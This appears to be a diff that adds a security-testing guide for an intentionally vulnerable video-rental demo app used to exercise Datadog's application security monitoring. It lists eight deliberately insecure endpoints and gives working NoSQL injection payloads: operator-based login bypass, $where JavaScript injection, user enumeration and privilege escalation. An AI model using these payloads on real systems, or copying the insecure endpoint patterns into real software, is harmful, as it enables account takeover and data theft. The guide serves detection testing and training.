@@ -1,0 +1,248 @@
+╔══════════════════════════════════════════════════════════════════════════════╗
+║              DATADOG USER TRACKING & SECURITY TESTING GUIDE                  ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+
+🎯 NEW FEATURES ADDED
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+✅ DATADOG USER TRACKING INSTRUMENTATION
+   • Tracks user activity across all authenticated requests
+   • Captures: User ID, Email, Username, Role
+   • Integrated in: Login, Register, Authentication Middleware
+   • Enables user attribution in Datadog ASM
+
+✅ 8 INTENTIONAL NOSQL INJECTION VULNERABILITIES
+   • User search injection
+   • Authentication bypass
+   • JavaScript injection via $where
+   • Query operator injection
+   • Broken access control
+   • User enumeration
+   • Blind NoSQL injection
+   • Privilege escalation
+
+✅ COMPREHENSIVE TESTING TOOLS
+   • Automated test script (test-vulnerabilities.sh)
+   • Full documentation (NOSQL_VULNERABILITIES.md)
+   • Attack examples and scenarios
+   • Prevention guidance
+
+
+📁 FILES CREATED/MODIFIED
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+NEW FILES:
+├── backend/routes/vulnerable.js       → 8 vulnerable endpoints
+├── NOSQL_VULNERABILITIES.md          → Complete testing guide
+├── test-vulnerabilities.sh            → Automated testing script
+└── DATADOG_SECURITY_TESTING.txt      → This file
+
+MODIFIED FILES:
+├── backend/routes/auth.js             → Added user tracking
+├── backend/middleware/auth.js         → Added user tracking
+├── backend/server.js                  → Added vulnerable routes
+└── README.md                          → Updated features list
+
+
+🔒 DATADOG USER TRACKING
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Implementation in auth.js and middleware/auth.js:
+
+const span = tracer.scope().active();
+if (span) {
+  span.setUser({
+    id: user._id.toString(),
+    email: user.email,
+    name: user.username,
+    role: user.role
+  });
+}
+
+WHEN IT TRACKS:
+  ✓ User registration (POST /api/auth/register)
+  ✓ User login (POST /api/auth/login)
+  ✓ Every authenticated request (via authenticate middleware)
+
+WHAT YOU'LL SEE IN DATADOG:
+  • User identities in all traces
+  • Attack attribution to specific users
+  • User behavior patterns
+  • Compromised account detection
+  • Session correlation
+
+
+🎯 VULNERABLE ENDPOINTS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Base URL: http://localhost:5000/api/vulnerable
+
+1. GET  /search-user              → User enumeration
+2. POST /insecure-login           → Authentication bypass
+3. GET  /search-movies-where      → JavaScript injection
+4. GET  /movies-by-price          → Operator injection
+5. GET  /rentals-insecure         → Access control bypass
+6. GET  /user-exists              → Regex injection
+7. GET  /search-slow              → Blind injection
+8. POST /update-profile-insecure  → Privilege escalation
+
+INFO:
+  GET /test-vulnerable            → List all vulnerabilities
+
+
+🧪 QUICK START TESTING
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. START THE APPLICATION:
+   cd video-rental-store
+   docker-compose up -d
+
+2. RUN THE TEST SCRIPT:
+   ./test-vulnerabilities.sh
+
+3. OR TEST MANUALLY:
+   # List all users
+   curl "http://localhost:5000/api/vulnerable/search-user?username[\$ne]=null"
+
+   # Bypass authentication
+   curl -X POST http://localhost:5000/api/vulnerable/insecure-login \
+     -H "Content-Type: application/json" \
+     -d '{"email":"user@example.com","password":{"$ne":null}}'
+
+   # JavaScript injection
+   curl "http://localhost:5000/api/vulnerable/search-movies-where?title=1;return true;//"
+
+4. CHECK DATADOG:
+   https://app.datadoghq.com/security/appsec
+
+
+📊 WHAT YOU'LL SEE IN DATADOG ASM
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+SECURITY SIGNALS:
+  • NoSQL Injection attempts
+  • Code Injection (JavaScript via $where)
+  • Authentication bypass attempts
+  • Access control violations
+  • User enumeration attacks
+
+USER INFORMATION:
+  • Attacker user IDs
+  • Email addresses
+  • Usernames
+  • Roles (user/admin)
+  • Attack patterns per user
+
+TRACES:
+  • Individual attack requests
+  • Full request/response data
+  • Query parameters used
+  • Attack payloads
+  • Response times
+
+
+💡 ATTACK EXAMPLES
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+EXAMPLE 1: Complete Account Takeover
+┌─────────────────────────────────────────────────────┐
+│ 1. Enumerate users                                  │
+│    GET /search-user?username[$regex]=^admin         │
+│                                                     │
+│ 2. Bypass authentication                            │
+│    POST /insecure-login                             │
+│    {"email":"admin@store.com","password":{"$ne":""}}│
+│                                                     │
+│ 3. Access all data                                  │
+│    GET /rentals-insecure?userId[$ne]=null          │
+└─────────────────────────────────────────────────────┘
+
+EXAMPLE 2: Privilege Escalation
+┌─────────────────────────────────────────────────────┐
+│ 1. Register as normal user                          │
+│    POST /api/auth/register                          │
+│                                                     │
+│ 2. Elevate to admin                                 │
+│    POST /update-profile-insecure                    │
+│    {"userId":"YOUR_ID","updateData":{"role":"admin"}}│
+└─────────────────────────────────────────────────────┘
+
+EXAMPLE 3: Data Extraction
+┌─────────────────────────────────────────────────────┐
+│ GET /search-user?username[$ne]=null                 │
+│ GET /movies-by-price?minPrice[$gte]=0&...          │
+│ GET /rentals-insecure?userId[$ne]=null             │
+└─────────────────────────────────────────────────────┘
+
+
+📚 DOCUMENTATION
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+DETAILED GUIDES:
+  • NOSQL_VULNERABILITIES.md  → Complete testing guide
+  • README.md                 → Updated with new features
+  • test-vulnerabilities.sh   → Automated testing
+
+DATADOG DOCUMENTATION:
+  • User Tracking: https://docs.datadoghq.com/security/application_security/how-it-works/add-user-info/
+  • ASM Overview: https://docs.datadoghq.com/security/application_security/
+
+
+⚠️  IMPORTANT WARNINGS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+❌ NEVER use vulnerable endpoints in production
+❌ NEVER deploy this to public internet
+❌ NEVER use with real customer data
+❌ ONLY for security testing and learning
+
+✓ USE FOR:
+  • Testing Datadog ASM
+  • Security training
+  • Vulnerability demonstration
+  • Learning attack patterns
+  • Testing detection capabilities
+
+
+🎓 LEARNING OUTCOMES
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+After using this application, you'll understand:
+  ✓ How NoSQL injection attacks work
+  ✓ Different attack vectors and techniques
+  ✓ How Datadog ASM detects threats
+  ✓ Importance of user tracking in security
+  ✓ Real-time threat detection capabilities
+  ✓ Attack attribution and correlation
+  ✓ How to fix NoSQL vulnerabilities
+
+
+🚀 NEXT STEPS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. Start the application:
+   docker-compose up -d
+
+2. Run test script:
+   ./test-vulnerabilities.sh
+
+3. View Datadog dashboard:
+   https://app.datadoghq.com/security/appsec
+
+4. Try manual attacks from NOSQL_VULNERABILITIES.md
+
+5. Observe detection in real-time
+
+6. Learn prevention techniques
+
+
+📞 SUPPORT
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Documentation: See NOSQL_VULNERABILITIES.md
+Test Script: ./test-vulnerabilities.sh
+Datadog Docs: https://docs.datadoghq.com/security/application_security/
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Happy Security Testing! 🔒
